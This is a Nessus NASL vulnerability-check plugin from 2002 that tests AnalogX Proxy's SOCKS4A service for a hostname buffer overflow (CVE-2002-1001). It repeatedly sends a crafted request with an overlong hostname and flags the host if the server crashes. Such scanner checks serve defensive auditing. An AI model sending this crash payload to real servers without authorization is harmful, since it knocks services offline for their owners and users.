#
# This script was written by Michel Arboi <arboi@alussinan.org>
# GPL
# 
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CAN
#
# References:
# Subject: Foundstone Advisory - Buffer Overflow in AnalogX Proxy
# Date: Mon, 1 Jul 2002 14:37:44 -0700
# From: "Foundstone Labs" <labs@foundstone.com>
# To: <da@securityfocus.com>
#
# Socks4a extension is described on 
# http://www.socks.nec.com/protocol/socks4a.protocol
#
# Vulnerable:
# AnalogX Proxy v4.07 and previous


if(description)
{
 script_id(11126);
 script_bugtraq_id(5138, 5139);
 script_version ("$Revision: 1.8 $");
 script_cve_id("CVE-2002-1001");
 name["english"] = "SOCKS4A hostname overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "
It was possible to kill the remote SOCKS4A server by
sending a request with a too long hostname.

A cracker may exploit this vulnerability to make your SOCKS server
crash continually or even execute arbitrary code on your system.

Solution : upgrade your software
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Too long hostname kills the SOCKS4A server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports("Services/socks4", 1080);
 script_dependencie("find_service.nes");
 exit(0);
}

########

include("misc_func.inc");



port = get_kb_item("Services/socks4");
if(!port) port = 1080;
if(! get_port_state(port)) exit(0);

soc = open_sock_tcp(port);
if(! soc) exit(0);

hlen = 512;	# 140 bytes are enough for AnalogX
# Connect to hostname on port 8080 (= 31*256+4)
cnx = raw_string(4, 1, 4, 31, 0, 0, 0, 1) + "nessus" + raw_string(0) 
	+ crap(hlen) + raw_string(0);

for (i=0; i < 6; i=i+1)
{
 send(socket: soc, data: cnx);
 r = recv(socket: soc, length: 8, timeout:1);
 close(soc);
 soc = open_sock_tcp(port);
 if(! soc) { security_hole(port);  exit(0); }
}

close(soc);
